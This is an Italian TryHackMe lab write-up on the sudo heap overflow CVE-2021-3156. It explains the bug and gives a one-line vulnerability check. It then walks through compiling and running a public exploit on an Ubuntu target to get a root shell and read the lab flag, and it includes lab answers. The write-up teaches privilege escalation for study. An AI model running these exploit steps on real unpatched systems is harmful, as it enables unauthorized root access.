#tryhackmelabs #laboratorio 

https://tryhackme.com/room/sudovulnssamedit

Nel gennaio 2021, [Qualys](https://qualys.com/) ha pubblicato un [post sul blog](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit) in cui descriveva dettagliatamente una nuova terrificante vulnerabilità nel programma sudo di Unix.

Nello specifico, si trattava di un overflow del buffer heap che consentiva a qualsiasi utente di aumentare i privilegi di root, senza bisogno di configurazioni errate. Questo exploit funziona con le impostazioni predefinite, per qualsiasi utente, indipendentemente dai permessi sudo, il che lo rende ancora più pericoloso. La vulnerabilità è stata patchata, ma colpisce qualsiasi versione non patchata del programma sudo, dalla 1.8.2 alla 1.8.31p2 e dalla 1.9.0 alla 1.9.5p1, il che significa che è presente da dieci anni.  

Il programma è stato patchato molto rapidamente (e le versioni patchate sono state inserite nei repository subito dopo), quindi questo exploit non funzionerà più sui target aggiornati; tuttavia, è ancora incredibilmente potente.

Come nel caso di CVE -2019-18634 (che abbiamo visto nella [seconda stanza sudovulns](https://tryhackme.com/room/sudovulnsbof) ), questa vulnerabilità è un buffer overflow nel programma sudo; tuttavia, questa volta la vulnerabilità è un buffer overflow _dell'heap_ , a differenza del buffer overflow _dello stack_ che abbiamo visto in precedenza. Lo stack è una sezione di memoria molto regolamentata che memorizza vari aspetti importanti di un programma. L'heap, d'altra parte, è riservato all'allocazione dinamica della memoria, consentendo una maggiore flessibilità nel modo in cui valori e costrutti vengono creati e utilizzati da un programma. Come nella stanza precedente, non entreremo troppo nei dettagli sul funzionamento di questo meccanismo per mantenere i contenuti accessibili anche ai principianti. Tutto ciò che dobbiamo capire è che questa vulnerabilità è incredibilmente potente e di vasta portata.

Quindi, per prima cosa, cosa possiamo fare per verificare se un sistema è vulnerabile?

Fortunatamente esiste un metodo molto semplice che possiamo usare per verificare: basta digitare questo comando in un terminale:

```
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```
Se il sistema è vulnerabile, questo sovrascriverà il buffer heap e causerà l'arresto anomalo del programma:
```
tryhackme@CVE-2021-3156:~$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
malloc(): memory corruption
Aborted (core dumped)
```

Questa PoC è stata ottenuta da un ricercatore di nome [lockedbyte](https://twitter.com/lockedbyte) , [qui](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156) .  

Quando l'avviso è stato pubblicato per la prima volta, Qualys non ha fornito il codice completo per l'exploit. Tuttavia, non ci è voluto molto perché altri ricercatori replicassero la vulnerabilità. La prima copia funzionante dell'exploit resa pubblica è stata creata da un ricercatore noto come [bl4sty](https://twitter.com/bl4sty) . Il loro codice exploit completo è disponibile su Github, [qui](https://github.com/blasty/CVE-2021-3156) . Questo è ciò che useremo per sfruttare la macchina che hai distribuito nel primo task.

Questa macchina è stata configurata per consentire un facile sfruttamento della vulnerabilità. Pertanto, il repository Github linkato sopra è già stato aggiunto al target.

Nella directory home vedrai una cartella chiamata "Exploit":
Entra in questa directory ( `cd Exploit`) e vedrai un file chiamato "Makefile". Questo indica che possiamo compilare automaticamente l'exploit semplicemente digitando " `make`" e premendo Invio:

Controllando nuovamente il contenuto della directory, vediamo che è apparso un nuovo file eseguibile:
```
tryhackme@CVE-2021-3156:~/Exploit$ ls
Makefile  README.md  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwich
```

Quando eseguiamo questo file ci verranno presentate diverse opzioni:

```
./sudo-hax-me-a-sandwich
```

```
tryhackme@CVE-2021-3156:~/Exploit$ ./sudo-hax-me-a-sandwich  

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------
```
Attualmente, questo exploit è in grado di colpire tre obiettivi. La macchina che abbiamo implementato è un server Ubuntu 18.04.5, quindi useremo l'obiettivo 0.

```
./sudo-hax-me-a-sandwich 0
```

Se eseguito con il target specificato come parametro, otteniamo una shell root!

Dopo aver compilato l'exploit, qual è il nome dell'eseguibile creato (sfocato negli screenshot qui sopra)?
```
sudo-hax-me-a-sandwich
```
Esegui l'exploit!
Ora dovresti avere una shell root: qual è il flag in `/root/flag.txt`?

```
cat /root/flag.txt
```

```
THM{xxxxxxxxxxxxxxxxxxxxxxx}
```
